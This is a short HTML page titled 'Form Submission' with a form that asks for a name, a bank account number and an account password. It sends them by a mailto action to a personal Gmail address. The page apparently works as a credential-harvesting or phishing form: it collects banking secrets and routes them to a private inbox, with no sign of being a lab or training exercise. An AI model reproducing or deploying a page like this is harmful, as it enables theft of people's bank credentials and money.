<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Submission</title>
</head>
<body>
    <form action="mailto:fahadchaudhary7868@gmail.com" method="post">
        <label for="userName">Name:</label>
        <input type="text" id="userName" name="userName" required><br><br>

        <label for="bankAccount">Bank Account:</label>
        <input type="text" id="bankAccount" name="bankAccount" pattern="[0-9 ]{20,}" title="Enter a valid bank account number (20 digits with spaces)"><br><br>

        <label for="accountPassword">Account Password:</label>
        <input type="password" id="accountPassword" name="accountPassword" required><br><br>

        <input type="submit" value="Submit">
    </form>
</body>
</html>
